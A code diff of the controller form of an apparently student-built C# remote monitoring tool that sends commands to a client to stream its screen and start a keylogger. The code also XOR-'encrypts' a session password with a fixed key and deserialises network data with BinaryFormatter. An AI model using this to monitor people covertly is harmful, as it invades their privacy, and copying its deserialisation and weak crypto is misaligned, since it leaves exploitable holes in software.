@@ -1,17 +1,12 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Drawing;
 using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Net.Sockets;
-using System.Net;
 using System.Threading;
-using System.Drawing.Imaging;
 using System.Runtime.Serialization.Formatters.Binary;
+using System.IO;
 namespace Server
 {
     public partial class ControlForm : Form
@@ -19,22 +14,13 @@ namespace Server
         private TcpClient client;
         private TcpClient screenClient;
         private TcpClient logClient;
-
-        private TcpListener server;
-        private TcpListener screenServer;
-        private TcpListener logServer;
-
+        string clientID;
         private NetworkStream mainStream;
         private NetworkStream screenStream;
-        private NetworkStream keylogStream;
-
-
         private static ManualResetEvent mre = new ManualResetEvent(false);
-
-        private readonly Thread Listening;  
         private Thread GetImage;
-        private Thread KeyLogger;
-        const string KEY = "CHUONG TRINH THEO DOI TU XA";// cho mã hóa
+
+        const string KEY = "CHUONG TRINH THEO DOI TU XA";
         bool stopsharing = false;
         public byte[] Xor(string a, string b)
         {
@@ -42,29 +28,25 @@ namespace Server
             char[] charBArray = b.ToCharArray();
 
             byte[] result = new byte[27];
-            // Set length to be the length of the shorter string
-
             for (int i = 0; i < 27; i++)
             {
-                result[i] = (byte)(charAArray[i] ^ charBArray[i]);// Error here
+                result[i] = (byte)(charAArray[i] ^ charBArray[i]);
             }
             return result;
         }
-
         public static byte[] Combine(byte[] first, byte[] second)
         {
             return first.Concat(second).ToArray();
         }
-
-
         public ControlForm(
                            TcpClient sclient,
                            TcpClient slogClient,
-                           TcpClient sscreenClient
+                           TcpClient sscreenClient,
+                           string ID
                           )
         {
-
             client = sclient;
+            clientID = ID;
             logClient = slogClient;
             screenClient = sscreenClient;
             Random random = new Random();
@@ -75,73 +57,30 @@ namespace Server
                 randomPassword += ((char)(random.Next(65, 90))).ToString();
 
             }
-            MessageBox.Show(randomPassword);
+            /***********************************************************/
+            try
+            {
+                string clientname = clientID.Replace(':', '_');
+                string filePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\[Password_[" + clientname + "]" + ".txt";
+                FileStream fs = new FileStream(filePath, FileMode.Create);
+                StreamWriter sr = new StreamWriter(fs, Encoding.UTF8);
+                sr.Write(randomPassword);
+                sr.Close();
+                fs.Close();
+            }
+            catch (Exception exc)
+            {
+                MessageBox.Show(exc.Message);
+            }
+            /************************************************************/
             byte[] encryptPassword = Xor(randomPassword, KEY);
             mainStream = client.GetStream();
-            Byte[] sendsecret = Combine(Combine(Encoding.ASCII.GetBytes("secret:") , encryptPassword), Encoding.ASCII.GetBytes("$"));
-            MessageBox.Show(sendsecret.Length.ToString());
+            Byte[] sendsecret = Combine(Combine(Encoding.ASCII.GetBytes("secret:"), encryptPassword), Encoding.ASCII.GetBytes("$"));
             mainStream.Write(sendsecret, 0, sendsecret.Length);
-
-            //client = new TcpClient();
-
-            //Listening = new Thread(StartListening);
             GetImage = new Thread(ReceiveImage);
-
-            //Listening.IsBackground = true;
             GetImage.IsBackground = true;
-
-
-
             InitializeComponent();
         }
-
-        //private void StartListening()
-        //{
-        //    try
-        //    {
-        //        server.Start();
-        //        screenServer.Start();
-        //        logServer.Start();
-        //        while (true)
-        //        {                             
-        //            client = server.AcceptTcpClient();
-        //            screenClient = screenServer.AcceptTcpClient();
-        //            logClient = logServer.AcceptTcpClient();
-
-        //            Random random = new Random();
-        //            int length = 10;
-        //            var secret = "";
-        //            for (var i = 0; i < length; i++)
-        //            {
-        //                secret += ((char)(random.Next(1, 26) + 64)).ToString();
-
-        //            }
-        //            mainStream = client.GetStream();
-        //            Byte[] sendsecret = Encoding.ASCII.GetBytes("secrete:" + secret + "$");
-        //            mainStream.Write(sendsecret, 0, sendsecret.Length);
-
-        //            //MessageBox.Show(secret);
-
-
-        //        }
-
-        //    }
-        //    catch
-        //    {
-        //        StopListening();
-        //    }
-        //}
-        //private void StopListening()
-        //{
-        //    server.Stop();
-        //    screenServer.Stop();
-        //    logServer.Stop();
-        //    if (Listening.IsAlive)
-        //        Listening.Abort();
-        //    //if (GetImage.IsAlive)
-        //    //    GetImage.Abort();
-
-        //}
         private void StopSharing()
         {
             stopsharing = true;
@@ -151,50 +90,43 @@ namespace Server
             try
             {
                 BinaryFormatter binaryFormatter = new BinaryFormatter();
-                
+
                 while (client.Connected && Thread.CurrentThread.IsAlive)
                 {
                     if (stopsharing)
                     {
                         ScreenCapture.Image = null;
                         mre.WaitOne();
-                        
+
                     }
                     screenStream = screenClient.GetStream();
                     ScreenCapture.Image = (Image)binaryFormatter.Deserialize(screenStream);
-                    
+
                 }
-                //else
-                    MessageBox.Show("Client disconnected");
+                MessageBox.Show("Client disconnected");
             }
             catch { MessageBox.Show("Client disconnected"); }
         }
         private void btnShareScreen_Click(object sender, EventArgs e)
         {
-            //Thread GetImage; 
             try
             {
                 if (btnShareScreen.Text == "Share screen")
-                {           
+                {
                     mainStream = client.GetStream();
                     Byte[] ShareScreenComand = Encoding.ASCII.GetBytes("Share Screen$");
                     mainStream.Write(ShareScreenComand, 0, ShareScreenComand.Length);
-
                     stopsharing = false;
-                    //MessageBox.Show(mre.GetType().ToString());
                     if (!GetImage.IsAlive)
                     {
-                        //GetImage = new Thread(ReceiveImage);
                         GetImage.Start();
                     }
                     else
                         mre.Set();
-                
-
                     btnShareScreen.Text = "Stop sharing";
                 }
 
-                else if(btnShareScreen.Text == "Stop sharing")
+                else if (btnShareScreen.Text == "Stop sharing")
                 {
                     StopSharing();
                     mainStream = client.GetStream();
@@ -202,38 +134,30 @@ namespace Server
                     mainStream.Write(StopShareScreenComand, 0, StopShareScreenComand.Length);
 
                     btnShareScreen.Text = "Share screen";
-                }    
+                }
             }
-            catch(Exception)
+            catch (Exception)
             {
                 MessageBox.Show("0 client connected");
             }
-
         }
-
         private void ControlForm_Load(object sender, EventArgs e)
         {
-            //server = new TcpListener(IPAddress.Any, 8080);
-            //screenServer = new TcpListener(IPAddress.Any, 8081);
-            //logServer = new TcpListener(IPAddress.Any, 8082);
-            //Listening.Start();
-        }
 
+        }
         private void btnHenGio_Click(object sender, EventArgs e)
         {
             try
             {
                 mainStream = client.GetStream();
-                Form HenGio = new HenGio(mainStream);
+                Form HenGio = new HenGio(mainStream, clientID);
                 HenGio.Show();
             }
-            catch(Exception)
+            catch (Exception)
             {
                 MessageBox.Show("0 client connected");
             }
-
         }
-
         private void btnLogger_Click(object sender, EventArgs e)
         {
             try
@@ -243,14 +167,13 @@ namespace Server
                 Byte[] LogComand = Encoding.ASCII.GetBytes("log$");
                 mainStream.Write(LogComand, 0, LogComand.Length);
 
-                Form Keylog = new Keylogger(logClient);
+                Form Keylog = new Keylogger(logClient, clientID);
                 Keylog.Show();
             }
-            catch(Exception ex)
+            catch (Exception)
             {
                 MessageBox.Show("0 client connected");
             }
-
         }
     }
 }
